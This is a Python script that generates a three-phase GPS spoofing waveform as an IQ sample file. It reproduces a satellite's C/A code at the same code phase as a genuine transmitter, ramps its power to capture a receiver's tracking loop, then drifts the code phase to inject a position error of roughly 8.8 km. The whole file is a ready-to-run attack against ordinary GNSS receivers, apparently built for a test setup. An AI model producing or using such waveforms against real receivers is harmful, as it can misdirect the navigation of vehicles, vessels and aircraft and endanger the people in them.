"""
generate_tx2_attack.py  — TX2 (Spoofer — 3-Phase Attack)
---------------------------------------------------------
Generates tx2_attack.bin: 3-phase spoofing waveform.

In this aligned version, the spoofer starts at the EXACT same code phase
as TX1 (START_OFFSET_CHIPS = 0). This is the correct physical way to
hijack a locked receiver tracking loop.

Just run it: python generate_tx2_attack.py
"""

import numpy as np
import os

# ── Settings ──────────────────────────────────────────────────────────────────
SV_ID             = 1      # must match TX1
PHASE1_S          = 5.0    # seconds: spoofer acquiring (low power, same chip)
PHASE2_S          = 10.0   # seconds: power ramp (capture)
PHASE3_S          = 15.0   # seconds: high power + drift (drag)
                           # Total = 30s — matches TX_DURATION_S exactly, no file loop
AMP_TX1           = 127.0  # TX1 max amplitude reference (assume worst case)
AMP_START         = 5.0    # TX2 start amplitude (well below TX1, not detectable)
AMP_PEAK          = 127.0  # TX2 peak amplitude (full 8-bit DAC range — maximum power)
DRIFT_CHIPS_PER_S = 2.0    # code phase drift rate in Phase 3 (chips/second)
                           # 2 chips/s × 15s = 30 chips = 8790m position error
START_OFFSET_CHIPS = 0     # 0 chips offset (synchronized start for lock hijack)
OUTPUT_FILE       = "tx2_attack.bin"

# ── Constants ─────────────────────────────────────────────────────────────────
SAMPLE_RATE      = 2_046_000
CHIP_RATE        = 1_023_000
SAMPLES_PER_CHIP = SAMPLE_RATE // CHIP_RATE  # 2
CODE_PERIOD      = 1023
SAMPLES_PER_CODE = CODE_PERIOD * SAMPLES_PER_CHIP  # 2046


def generate_prn(sv_id):
    G2_TAPS = {
        1:(2,6),2:(3,7),3:(4,8),4:(5,9),5:(1,9),6:(2,10),7:(1,8),
        8:(2,9),9:(3,10),10:(2,3),11:(3,4),12:(5,6),13:(6,7),14:(7,8),
        15:(8,9),16:(9,10),17:(1,4),18:(2,5),19:(3,6),20:(4,7),
        21:(5,8),22:(6,9),23:(1,3),24:(4,6),25:(5,7),26:(6,8),
        27:(7,9),28:(8,10),29:(1,6),30:(2,7),31:(3,8),32:(4,9),
    }
    def lfsr(taps, n=1023):
        reg=[1]*10; out=[]
        for _ in range(n):
            out.append(reg[-1])
            fb=0
            for t in taps: fb^=reg[t-1]
            reg=[fb]+reg[:-1]
        return np.array(out, dtype=np.int8)
    g1  = lfsr([3,10])
    g2f = lfsr([2,3,6,8,9,10])
    ta, tb = G2_TAPS[sv_id]
    g2d = np.array([(g2f[(i+1023-(ta-1))%1023] ^ g2f[(i+1023-(tb-1))%1023])
                    for i in range(1023)], dtype=np.int8)
    return 1.0 - 2.0 * ((g1 ^ g2d) & 1).astype(np.float32)


total_s  = PHASE1_S + PHASE2_S + PHASE3_S
n1 = int(PHASE1_S * SAMPLE_RATE)
n2 = int(PHASE2_S * SAMPLE_RATE)
n3 = int(PHASE3_S * SAMPLE_RATE)
n_total  = n1 + n2 + n3

capture_t = PHASE1_S + PHASE2_S * (AMP_TX1 - AMP_START) / (AMP_PEAK - AMP_START)
total_drift = DRIFT_CHIPS_PER_S * PHASE3_S

print(f"[TX2 Attack] SV{SV_ID}  Total={total_s:.0f}s")
print(f"  Phase 1: 0-{PHASE1_S:.0f}s    LOW power ({AMP_START}) — acquiring")
print(f"  Phase 2: {PHASE1_S:.0f}-{PHASE1_S+PHASE2_S:.0f}s  RAMPING ({AMP_START}->{AMP_PEAK}) — capture at ~{capture_t:.1f}s")
print(f"  Phase 3: {PHASE1_S+PHASE2_S:.0f}-{total_s:.0f}s  HIGH + DRIFT ({DRIFT_CHIPS_PER_S} chips/s) — dragging")
print(f"  Total position error injected: {total_drift * 293:.0f} m ({total_drift:.1f} chips)")

chips = generate_prn(SV_ID)

# ── Build chip-phase accumulator (vectorized) ─────────────────────────────────
normal_advance = CHIP_RATE / SAMPLE_RATE          # 0.5 chips/sample
drift_advance  = (CHIP_RATE + DRIFT_CHIPS_PER_S) / SAMPLE_RATE

chip_advance         = np.empty(n_total, dtype=np.float64)
chip_advance[:n1+n2] = normal_advance    # Phase 1 & 2: locked to same code phase
chip_advance[n1+n2:] = drift_advance     # Phase 3: slowly drifting

chip_phase   = np.cumsum(chip_advance) + START_OFFSET_CHIPS
chip_indices = np.floor(chip_phase).astype(np.int64) % CODE_PERIOD
signal       = chips[chip_indices].astype(np.float32)

# ── Amplitude envelope ────────────────────────────────────────────────────────
amplitude         = np.empty(n_total, dtype=np.float32)
amplitude[:n1]    = AMP_START
amplitude[n1:n1+n2] = np.linspace(AMP_START, AMP_PEAK, n2, dtype=np.float32)
amplitude[n1+n2:] = AMP_PEAK

tx2_signal = signal * amplitude

# ── Write int8 IQ file ────────────────────────────────────────────────────────
i_int8 = np.clip(tx2_signal, -127, 127).astype(np.int8)
q_int8 = np.zeros(n_total, dtype=np.int8)

interleaved       = np.empty(2 * n_total, dtype=np.int8)
interleaved[0::2] = i_int8
interleaved[1::2] = q_int8
interleaved.tofile(OUTPUT_FILE)

print(f"\nDone. {OUTPUT_FILE}  ({os.path.getsize(OUTPUT_FILE)/1e6:.0f} MB)")
